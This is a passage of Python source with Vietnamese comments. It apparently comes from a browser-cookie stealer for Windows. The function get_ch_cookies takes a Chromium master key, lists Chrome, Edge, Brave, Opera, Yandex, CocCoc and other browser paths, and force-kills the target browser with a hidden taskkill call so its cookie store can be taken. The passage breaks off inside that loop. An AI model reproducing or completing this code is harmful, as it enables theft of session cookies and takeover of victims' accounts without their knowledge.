...
def get_ch_cookies(browser, path, profile, ch_master_key):
    ...
    # Lấy thư mục người dùng hiện tại
    user_local = os.getenv("LOCALAPPDATA")

    # Danh sách trình duyệt hỗ trợ và đường dẫn file thực thi
    supported_browsers = {
        "Chrome": "C:/Program Files/Google/Chrome/Application/chrome.exe",
        "Edge": "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe",
        "Brave": "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe",
        "Opera": os.path.join(user_local, "Programs/Opera/opera.exe"),
        "Opera GX": os.path.join(user_local, "Programs/Opera GX/opera.exe"),
        "UC Browser": "C:/Program Files (x86)/UCWeb/UCBrowser/Application/ucbrowser.exe",
        "Vivaldi": os.path.join(user_local, "Vivaldi/Application/vivaldi.exe"),
        "Yandex": os.path.join(user_local, "Yandex/YandexBrowser/Application/browser.exe"),
        "CocCoc": "C:/Program Files/CocCoc/Browser/Application/browser.exe"
    }

    # Loại bỏ các trình duyệt có đường dẫn không hợp lệ
    supported_browsers = {k: v for k, v in supported_browsers.items() if os.path.exists(v)}

    # Kiểm tra trình duyệt có được hỗ trợ hay không
    executable_path = supported_browsers.get(browser)

    if executable_path:
        while True:
            try:
                subprocess.run(["taskkill", "/F", "/IM", os.path.basename(executable_path)], creationflags=0x08000000)
